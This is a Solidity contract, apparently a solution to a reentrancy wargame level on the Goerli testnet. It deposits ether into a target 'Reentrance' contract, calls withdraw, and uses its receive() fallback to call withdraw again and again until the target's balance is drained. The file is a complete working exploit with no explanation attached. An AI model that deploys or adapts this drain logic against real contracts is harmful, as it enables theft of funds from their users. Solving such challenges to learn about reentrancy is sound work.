// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Reentrance.sol';


contract ReentranceAttack {
  Reentrance reentrance;
  address reentranceAddress = 0x2c2b7071aA0B065112390DE902258A29C1C6933B; //Goerli
  uint256 amount = 100000;

  constructor(){
    reentrance = Reentrance(payable(reentranceAddress));
  }

  function callDonate() public payable  {
    amount = msg.value;
    reentrance.donate{value: amount}(address(this));

  }

  function attack() public payable  {
    reentrance.donate{value: msg.value}(address(this));
    reentrance.withdraw(msg.value);
  }

  receive() external payable {
    uint256 balance = address(reentranceAddress).balance;
    if (balance>amount) {
    reentrance.withdraw(amount);
    }
  }
}